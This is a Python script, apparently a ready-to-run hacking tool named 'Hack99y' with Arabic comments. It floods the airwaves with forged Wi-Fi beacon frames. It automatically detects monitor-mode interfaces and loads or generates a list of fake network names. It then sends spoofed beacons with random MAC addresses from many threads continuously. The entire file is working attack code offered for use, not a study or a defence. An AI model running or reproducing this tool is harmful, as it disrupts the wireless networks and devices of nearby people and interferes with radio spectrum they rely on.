from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, RandMAC
import threading
import sys
import os
import subprocess

# واجهة الأداة الرسومية (Banner)
BANNER = """
  _    _            _     ___   ___             
 | |  | |          | |   / _ \ / _ \            
 | |__| | __ _  ___| | _| (_) | (_) |_   _      
 |  __  |/ _` |/ __| |/ /> _ < \__, | | | |     
 | |  | | (_| | (__|   <| (_) |  / /| |_| |     
 |_|  |_|\__,_|\___|_|\_\\___/  /_/  \__, |     
                                      __/ |     
      [ Multi-Interface Beacon Flooder ] |___/      
"""

names_file = "names.txt"

def get_monitor_interfaces():
    """البحث التلقائي عن واجهات الشبكة التي تعمل بوضع Monitor"""
    interfaces = []
    try:
        # تنفيذ أمر iwconfig لقراءة حالة الكروت
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()
        for line in output.split('\n'):
            if "Mode:Monitor" in line or "Mode:monitor" in line:
                # استخراج اسم الواجهة (مثل wlan0 أو wlan0mon)
                iface = line.split()[0]
                interfaces.append(iface)
    except Exception as e:
        print(f"[-] Error checking interfaces: {e}")
    return interfaces

def send_beacon(ssid, mac, iface):
    """بناء وإرسال حزم Beacon"""
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    
    # إرسال مستمر (inter=0.1 تعني 10 حزم في الثانية لكل شبكة)
    sendp(frame, iface=iface, inter=0.1, loop=1, verbose=False)

def start_hack99y():
    os.system('clear')
    print(BANNER)
    
    # اكتشاف الواجهات تلقائياً
    active_ifaces = get_monitor_interfaces()
    if not active_ifaces:
        print("[-] Error: No interfaces found in Monitor Mode!")
        print("[!] Make sure to run the shell script first.")
        return

    if not os.path.exists(names_file):
        print(f"[-] Error: {names_file} not found! Generating one now...")
        with open(names_file, "w") as f:
            for i in range(100): f.write(f"Hacky{i}\n")

    with open(names_file, "r") as f:
        ssids = [line.strip() for line in f.readlines()]

    print(f"[*] Interfaces Detected: {', '.join(active_ifaces)}")
    print(f"[*] Total Networks: {len(ssids)}")
    print("-" * 50)

    threads = []
    for i, ssid in enumerate(ssids):
        # توزيع الشبكات بالتساوي على الواجهات المكتشفة
        iface = active_ifaces[i % len(active_ifaces)] 
        mac = RandMAC()
        
        t = threading.Thread(target=send_beacon, args=(ssid, mac, iface))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[!] Hack99y is now flooding the air... Press Ctrl+C to stop.")
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Hack99y shutting down... Cleaning up threads.")
        sys.exit()

if __name__ == "__main__":
    start_hack99y()
